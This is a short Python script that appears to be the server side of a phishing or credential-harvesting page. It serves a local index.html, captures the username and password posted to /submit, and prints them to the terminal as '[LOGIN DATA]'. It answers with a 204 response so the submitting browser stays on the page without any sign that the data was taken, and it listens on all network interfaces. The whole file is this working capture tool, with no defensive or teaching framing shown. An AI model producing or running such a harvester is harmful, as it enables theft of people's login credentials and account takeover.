#!/usr/bin/env python3
from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse

PORT = 8080

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/" or self.path == "/index.html":
            with open("index.html", "rb") as f:
                self.send_response(200)
                self.send_header("Content-type", "text/html")
                self.end_headers()
                self.wfile.write(f.read())
        else:
            self.send_error(404, "Not Found")

    def do_POST(self):
        if self.path == "/submit":
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode()
            fields = urllib.parse.parse_qs(post_data)

            username = fields.get("username", [""])[0]
            password = fields.get("password", [""])[0]

            # Print directly to terminal
            print(f"[LOGIN DATA] Username: {username} | Password: {password}")

            # Respond with "no content" so browser stays on page
            self.send_response(204)
            self.end_headers()
        else:
            self.send_error(404, "Not Found")

if __name__ == "__main__":
    print(f"Server running at http://localhost:{PORT}/index.html")
    HTTPServer(("0.0.0.0", PORT), Handler).serve_forever()
